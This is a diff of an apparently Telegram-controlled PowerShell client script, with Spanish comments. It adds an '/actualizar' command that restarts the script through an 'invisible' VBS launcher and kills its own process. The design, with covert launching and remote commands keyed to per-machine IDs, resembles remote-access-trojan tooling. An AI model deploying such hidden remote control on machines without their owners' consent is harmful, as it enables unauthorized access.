@@ -149,6 +149,22 @@ while ($true) {
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                             continue
                         }
+                        "/actualizar" {
+                            $Respuesta = "🔄 Actualizando script en ID $MiIDNum... Leyendo archivo nuevo."
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
+                            
+                            # 1. Espera un segundo para asegurar que el mensaje de Telegram salga bien
+                            Start-Sleep -Seconds 1
+                            
+                            # 2. Llama al lanzador invisible VBS para que vuelva a iniciar el script en limpio
+                            if (Test-Path "C:\ScriptCliente\lanzador.vbs") {
+                                Start-Process "wscript.exe" -ArgumentList "C:\ScriptCliente\lanzador.vbs"
+                            }
+                            
+                            # 3. Mata el proceso actual de PowerShell para liberar la memoria vieja
+                            Stop-Process -Id $PID -Force
+                            continue
+                        }
 
                         "/notepad" {
                             Start-Process "notepad.exe"
